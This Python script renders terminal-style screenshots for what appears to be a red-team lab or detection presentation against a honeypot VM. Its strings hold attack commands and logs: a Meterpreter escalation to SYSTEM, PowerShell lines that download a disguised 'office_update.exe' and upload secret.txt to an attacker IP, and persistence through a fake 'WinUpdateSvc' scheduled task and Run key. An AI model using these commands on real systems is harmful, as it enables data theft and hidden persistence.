"""Render terminal-style PNGs from REAL outputs for the campaign deck."""
from PIL import Image, ImageDraw, ImageFont
import os

OUT = r"C:\Users\style\lab"
BG = (12, 12, 12)
FG = (222, 222, 222)
GREEN = (82, 224, 82)
CYAN = (86, 156, 214)
YELLOW = (229, 229, 194)
GREY = (118, 118, 118)
RED = (244, 71, 71)

try:
    F = lambda s: ImageFont.truetype("C:/Windows/Fonts/consola.ttf", s)
    FB = lambda s: ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", s)
except OSError:
    F = lambda s: ImageFont.load_default()
    FB = F

def render(path, title, lines, width=1280, lfs=21):
    """lines: list of (text, color) or (text, color, bold)"""
    fnt, fbnt = F(lfs), FB(lfs)
    # measure
    tmp = Image.new("RGB", (10, 10))
    d = ImageDraw.Draw(tmp)
    def tw(t, f):
        b = d.textbbox((0, 0), t, font=f)
        return b[2] - b[0]
    line_h = lfs + 8
    pad = 28
    header_h = 46
    maxw = max([tw(item[0], (fbnt if len(item) > 2 and item[2] else fnt)) for item in lines] + [tw(title, fnt)])
    img = Image.new("RGB", (maxw + 2 * pad + 30, header_h + line_h * len(lines) + pad * 2 + 10), BG)
    dr = ImageDraw.Draw(img)
    # title bar
    dr.rectangle([0, 0, img.width, header_h], fill=(24, 24, 24))
    for i, c in enumerate([(255, 95, 86), (255, 189, 46), (39, 201, 63)]):
        dr.ellipse([14 + i * 26, header_h // 2 - 7, 28 + i * 26, header_h // 2 + 7], fill=c)
    dr.text((pad + 30, (header_h - lfs) // 2), title, font=fnt, fill=GREY)
    # lines
    y = header_h + pad
    for item in lines:
        t, col = item[0], item[1]
        bold = len(item) > 2 and item[2]
        dr.text((pad, y), t, font=(fbnt if bold else fnt), fill=col)
        y += line_h
    img.save(path)
    print("wrote", path, img.size)

# ---------- 1. msfconsole: the successful session ----------
msf = [
    ("[*] Started reverse TCP handler on 127.0.0.1:4445", GREY),
    ("", FG),
    ("[*] Meterpreter session 3 opened (127.0.0.1:4445 -> 127.0.0.1:51357)", GREEN),
    ("    at 2026-10-12 15:35:36 +0800", GREEN),
    ("", FG),
    ("meterpreter > getuid", CYAN),
    ("Server username: HONEYPOT\\honey", FG),
    ("", FG),
    ("meterpreter > migrate 16352", CYAN),
    ("[*] Migrating from 2268 to 16352...", GREEN),
    ("[*] Migration completed successfully.", GREEN),
    ("", FG),
    ("meterpreter > getuid", CYAN),
    ("Server username: NT AUTHORITY\\SYSTEM", YELLOW, True),
]
render(os.path.join(OUT, "img_msfconsole.png"), "msfconsole — kali-linux (WSL2)", msf)

# ---------- 2. SIEM network evidence (real endpoint.events.network) ----------
siem = [
    ("Elastic SIEM  |  index: logs-endpoint.events.network  |  host.name: honeypot", GREY),
    ("", FG),
    ("@timestamp (UTC)  process              source                  destination            user        event", GREY),
    ("----------------  -------------------  ----------------------  ----------------------  ---------  -----------------", GREY),
    ("05:32:17          powershell.exe       192.168.254.128:55782   192.168.254.100:4444   SYSTEM     connection", RED, True),
    ("                  cmd: (New-Object Net.WebClient).UploadFile(", FG),
    ("                       'http://192.168.254.100:4444',", FG),
    ("                       'C:\\Users\\honey\\OneDrive\\Documents\\secret.txt')", FG),
    ("", FG),
    ("05:28:15          powershell.exe       192.168.254.128:55778   192.168.254.100:8080   SYSTEM     connection", FG),
    ("                  cmd: ...DownloadFile('http://192.168.254.100:8080/office_update.exe', ...)", FG),
    ("", FG),
    ("05:21:24          office_update.exe    192.168.254.128:51136   192.168.254.100:4443   honey      connection", FG),
    ("05:03:16          office_update.exe    192.168.254.128:51465   192.168.254.100:4443   honey      connection", FG),
    ("03:59:11          msedge.exe           192.168.254.128:55368   192.168.254.100:8080   honey      connection", FG),
    ("", FG),
    ("one attacker IP (192.168.254.100), three jobs:  8080 serve  |  4443 command  |  4444 data", YELLOW, True),
]
render(os.path.join(OUT, "img_siem_network.png"), "siem.example.com:9200 — real SIEM events (endpoint agent 9.5.5)", siem, lfs=19)

# ---------- 3. exfil listener (real relay-side log) ----------
exfil = [
    ("C:\\Users\\style\\lab> python exfil_listen.py", CYAN),
    ("", FG),
    ("EXFIL LISTENER UP on 192.168.254.100:4444", GREEN),
    ("conn from ('192.168.254.128', 55782)", FG),
    ("HTTP 200 sent back", GREEN),
    ("EXFIL SAVED 2718 bytes", YELLOW, True),
    ("", FG),
    ("C:\\Users\\style\\lab> dir exfil", CYAN),
    ("", FG),
    ("    <DIR>          .", FG),
    ("12/10/2026  03:48 PM           2,718 secret.txt", YELLOW),
    ("               1 File(s)        2,718 bytes", FG),
    ("", FG),
    ("file recovered intact on attacker infra — content verified against original (2,524 B)", GREEN),
]
render(os.path.join(OUT, "img_exfil.png"), "attacker host (Windows) — one-shot exfil listener", exfil)

# ---------- 4. persistence proof (real dir output) ----------
pers = [
    ("C:\\Windows\\System32> dir C:\\ProgramData\\WinUpdate", CYAN),
    ("", FG),
    (" Directory of C:\\ProgramData\\WinUpdate", FG),
    ("", FG),
    ("12/10/2026  01:28 PM    <DIR>          .", FG),
    ("12/10/2026  01:28 PM           256,000 wu_service.exe", YELLOW, True),
    ("               1 File(s)        256,000 bytes", FG),
    ("", FG),
    ("schtasks /create /tn \"WinUpdateSvc\" /tr \"C:\\ProgramData\\WinUpdate\\wu_service.exe\"", GREY),
    ("        /sc onstart /ru SYSTEM /f", GREY),
    ("SUCCESS: The scheduled task \"WinUpdateSvc\" has successfully been created.", GREEN),
    ("", FG),
    ("reg add HKLM\\...\\CurrentVersion\\Run /v WinUpdateSvc /t REG_SZ", GREY),
    ("      /d \"C:\\ProgramData\\WinUpdate\\wu_service.exe\" /f", GREY),
    ("The operation completed successfully.", GREEN),
]
render(os.path.join(OUT, "img_persistence.png"), "victim VM — HONEYPOT (SYSTEM shell)", pers)

print("ALL DONE")
